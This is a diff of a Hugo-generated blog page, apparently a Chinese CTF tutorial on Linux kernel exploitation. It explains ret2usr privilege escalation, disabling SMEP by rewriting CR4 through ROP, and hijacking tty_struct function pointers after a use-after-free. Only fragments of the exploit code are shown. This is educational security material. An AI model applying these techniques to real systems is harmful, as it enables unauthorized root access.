@@ -33,7 +33,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.55.2" />
+<meta name="generator" content="Hugo 0.75.1" />
 
 
 <link rel="canonical" href="https://bash-c.github.io/post/linux-kernel-pwn-abc-2/" />
@@ -62,15 +62,12 @@
 <meta property="og:description" content="这一篇讲 ret2usr 攻击和 smep 保护。主要参考了 Pratical SMEP bypass techniques on Linux。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://bash-c.github.io/post/linux-kernel-pwn-abc-2/" />
-<meta property="article:published_time" content="2018-10-06T12:57:09&#43;08:00"/>
-<meta property="article:modified_time" content="2018-10-06T12:57:09&#43;08:00"/>
-
+<meta property="article:published_time" content="2018-10-06T12:57:09+08:00" />
+<meta property="article:modified_time" content="2018-10-06T12:57:09+08:00" />
 <meta itemprop="name" content="Linux Kernel Pwn ABC(II)">
 <meta itemprop="description" content="这一篇讲 ret2usr 攻击和 smep 保护。主要参考了 Pratical SMEP bypass techniques on Linux。">
-
-
-<meta itemprop="datePublished" content="2018-10-06T12:57:09&#43;08:00" />
-<meta itemprop="dateModified" content="2018-10-06T12:57:09&#43;08:00" />
+<meta itemprop="datePublished" content="2018-10-06T12:57:09+08:00" />
+<meta itemprop="dateModified" content="2018-10-06T12:57:09+08:00" />
 <meta itemprop="wordCount" content="2642">
 
 
@@ -340,20 +337,19 @@
   <h2 class="post-toc-title">Table of Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#ret2usr">ret2usr</a>
-<ul>
-<li><a href="#2018-强网杯-core">2018 强网杯 - core</a></li>
-</ul></li>
-<li><a href="#smep">SMEP</a>
-<ul>
-<li><a href="#smep-和-cr4-寄存器">smep 和 CR4 寄存器</a></li>
-<li><a href="#ciscn2017-babydriver">CISCN2017 - babydriver</a></li>
-</ul></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#ret2usr">ret2usr</a>
+      <ul>
+        <li><a href="#2018-强网杯---core">2018 强网杯 - core</a></li>
+      </ul>
+    </li>
+    <li><a href="#smep">SMEP</a>
+      <ul>
+        <li><a href="#smep-和-cr4-寄存器">smep 和 CR4 寄存器</a></li>
+        <li><a href="#ciscn2017---babydriver">CISCN2017 - babydriver</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
   </div>
 </div>
@@ -361,19 +357,14 @@
     
     <div class="post-content">
       <p>这一篇讲 ret2usr 攻击和 smep 保护。主要参考了 <a href="https://github.com/bash-c/slides/blob/master/pwn_kernel/smep_bypass.pdf">Pratical SMEP bypass techniques on Linux</a>。</p>
-
 <h2 id="ret2usr">ret2usr</h2>
-
 <p>ret2usr 攻击利用了 <strong>用户空间的进程不能访问内核空间，但内核空间能访问用户空间</strong> 这个特性来定向内核代码或数据流指向用户控件，以 <code>ring 0</code> 特权执行用户空间代码完成提权等操作。</p>
-
-<h3 id="2018-强网杯-core">2018 强网杯 - core</h3>
-
-<p>上一篇分析了使用 <a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/#kernel-rop-2018强网杯-core">kernel rop</a> 完成提权拿 shell 的步骤，这一篇分析一下使用 ret2usr 手法获取 root shell。</p>
-
+<h3 id="2018-强网杯---core">2018 强网杯 - core</h3>
+<p>上一篇分析了使用 <a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/#kernel-rop-2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core">kernel rop</a> 完成提权拿 shell 的步骤，这一篇分析一下使用 ret2usr 手法获取 root shell。</p>
 <p>题目就不再分析了，直接分析 exp。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">  1
+<pre class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -646,102 +637,87 @@
 	<span class="n">getchar</span><span class="p">();</span>
 	<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">rop</span><span class="p">,</span> <span class="mh">0x30</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
 	<span class="n">core_copy_func</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xffffffffffff0000</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>比较一下和 <a href="https://github.com/bash-c/pwn_repo/blob/master/QWB2018_core/rop.c">kernel rop</a> 做法的异同。</p>
-
+</div><p>比较一下和 <a href="https://github.com/bash-c/pwn_repo/blob/master/QWB2018_core/rop.c">kernel rop</a> 做法的异同。</p>
 <ol>
 <li>通过读取 <code>/tmp/kallsyms</code> 获取 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code> 的方法相同，同时根据这些偏移能确定 gadget 的地址。</li>
 <li>leak canary 的方法也相同，通过控制全局变量 <code>off</code> 读出 canary。</li>
 <li>与 kernel rop 做法不同的是 rop 链的构造
-
 <ol>
 <li>kernel rop 通过 内核空间的 rop 链达到执行 <code>commit_creds(prepare_kernel_cred(0))</code> 以提权目的，之后通过 <code>swapgs; iretq</code> 等返回到用户态，执行用户空间的 <code>system(&quot;/bin/sh&quot;)</code> 获取 shell</li>
 <li>ret2usr 做法中，直接返回到用户空间构造的 <code>commit_creds(prepare_kernel_cred(0))</code> （通过函数指针实现）来提权，虽然这两个函数位于内核空间，但此时我们是 <code>ring 0</code> 特权，因此可以正常运行。之后也是通过 <code>swapgs; iretq</code> 返回到用户态来执行用户空间的 <code>system(&quot;/bin/sh&quot;)</code></li>
-</ol></li>
 </ol>
-
+</li>
+</ol>
 <p>从这两种做法的比较可以体会出之所以要 <code>ret2usr</code>，是因为一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多。</p>
-
 <h2 id="smep">SMEP</h2>
-
 <p>为了防止 <code>ret2usr</code> 攻击，内核开发者提出了 <code>smep</code> 保护，smep 全程(Supervisor Mode Execution Protection)，是内核的一种保护措施，作用是当 CPU 处于 <code>ring0</code> 模式时，执行 <code>用户空间的代码</code> 会触发页错误；这个保护在 arm 中被称为 <code>PXN</code>。</p>
-
 <p>通过 qemu 启动内核时的选项可以判断是否开启了 smep 保护。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> grep smep ./boot.sh
-qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="s1">&#39;console=ttyS0 root=/dev/ram oops=panic panic=1&#39;</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp <span class="nv">cores</span><span class="o">=</span><span class="m">1</span>,threads<span class="o">=</span><span class="m">1</span> -cpu kvm64,+smep</code></pre></td></tr></table>
+qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="s1">&#39;console=ttyS0 root=/dev/ram oops=panic panic=1&#39;</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp <span class="nv">cores</span><span class="o">=</span>1,threads<span class="o">=</span><span class="m">1</span> -cpu kvm64,+smep
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>也可以通过</p>
+</div><p>也可以通过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> grep smep /proc/cpuinfo 
 flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts
-......</code></pre></td></tr></table>
+......
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>检测该保护是否开启。</p>
-
+</div><p>检测该保护是否开启。</p>
 <h3 id="smep-和-cr4-寄存器">smep 和 CR4 寄存器</h3>
-
 <p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fvzmqcu1irj30py06egmo.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fvzmqcu1irj30py06egmo.jpg" alt=""></p>
 <p>例如，当</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要</p>
+</div><p>时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">mov</span> <span class="no">cr4</span><span class="p">,</span> <span class="mi">0x1407e0</span>
-<span class="err">#</span> <span class="err">0</span><span class="nf">x1407e0</span> <span class="err">=</span> <span class="mi">101</span> <span class="mi">0</span> <span class="mi">0000</span> <span class="mi">0011</span> <span class="mi">1111</span> <span class="mi">00000</span></code></pre></td></tr></table>
+<span class="c"># 0x1407e0 = 101 0 0000 0011 1111 00000
+</span></code></pre></td></tr></table>
 </div>
-</div>
-<p>即可关闭 smep 保护。</p>
-
+</div><p>即可关闭 smep 保护。</p>
 <p>搜索一下从 <code>vmlinux</code> 中提取出的 gadget，很容易就能达到这个目的。</p>
-
 <ul>
 <li>如何查看 CR4 寄存器的值？
-
 <ul>
 <li>gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code>。</li>
-</ul></li>
 </ul>
-
-<h3 id="ciscn2017-babydriver">CISCN2017 - babydriver</h3>
-
+</li>
+</ul>
+<h3 id="ciscn2017---babydriver">CISCN2017 - babydriver</h3>
 <p>之前已经分析过使用 <a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/#kernel-uaf-ciscn2017-babydriver">uaf 改 cred</a> 的做法，这次换一种方法，通过关闭 smep 保护和 ret2usr 来提权。</p>
-
 <p>这里选取的方法是先通过 uaf 控制一个 <code>tty_struct</code> 结构，在 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> 时会分配这样一个结构体</p>
-
 <p><code>tty_struct</code> 的 <a href="https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct">源码</a> 如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -846,13 +822,13 @@ flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36
 	<span class="cm">/* If the tty has a pending do_SAK, queue it here - akpm */</span>
 	<span class="k">struct</span> <span class="n">work_struct</span> <span class="n">SAK_work</span><span class="p">;</span>
 	<span class="k">struct</span> <span class="n">tty_port</span> <span class="o">*</span><span class="n">port</span><span class="p">;</span>
-<span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span></code></pre></td></tr></table>
+<span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>为什么要控制这个结构体呢？因为其中有另一个很有趣的结构体 <code>tty_operations</code>，<a href="https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations">源码</a> 如下：</p>
+</div><p>为什么要控制这个结构体呢？因为其中有另一个很有趣的结构体 <code>tty_operations</code>，<a href="https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations">源码</a> 如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -943,13 +919,13 @@ flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36
 	<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">poll_put_char</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">,</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span> <span class="kt">char</span> <span class="n">ch</span><span class="p">);</span>
 <span class="cp">#endif
 </span><span class="cp"></span>	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">proc_show</span><span class="p">)(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="p">);</span>
-<span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span></code></pre></td></tr></table>
+<span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>大把的函数指针（pwn 手的风水宝地），因此设想构造下图所示结构体</p>
+</div><p>大把的函数指针（pwn 手的风水宝地），因此设想构造下图所示结构体</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -961,9 +937,9 @@ flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">fake_tty_struct  fake_tty_operations
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">fake_tty_struct  fake_tty_operations
 +---------+      +----------+
 |magic    |  +--&gt;|evil 1    |
 +---------+  |   +----------+
@@ -974,21 +950,18 @@ flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36
 +---------+      |evil 4    |
 |......   |      +----------+
 |......   |      |......    |
-+---------+      +----------+</pre></td></tr></table>
++---------+      +----------+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>那么我们就可以通过不同的操作（如 <code>write, ioctl</code> 等）来跳转到不同的 evil 了。</p>
-
+</div><p>那么我们就可以通过不同的操作（如 <code>write, ioctl</code> 等）来跳转到不同的 evil 了。</p>
 <p>对这道题目而言，因为开启了 smep 保护，因此如果想 ret2usr 提权，需要修改 cr4 的值，而控制函数指针是不够的，可以控制函数指针进行 stack pivot 等操作到我们排布 rop 链的空间，通过 rop 关闭 smep，进而进行后续操作。</p>
-
 <blockquote>
 <p>这道题目没给 vmlinux，需要使用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 解压内核镜像。</p>
 </blockquote>
-
 <p>关闭 smep 保护后，就可以通过 rop 来为所欲为了，最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/uaf_tty_struct.c">exp</a> 如下:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1151,7 +1124,8 @@ flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36
     <span class="n">write</span><span class="p">(</span><span class="n">fd_tty</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
 
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
 </div>
     </div>
@@ -1287,7 +1261,7 @@ flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36
     &copy;
     
        -
-    2019
+    2020
     <span class="heart">
       
       <i class="iconfont">
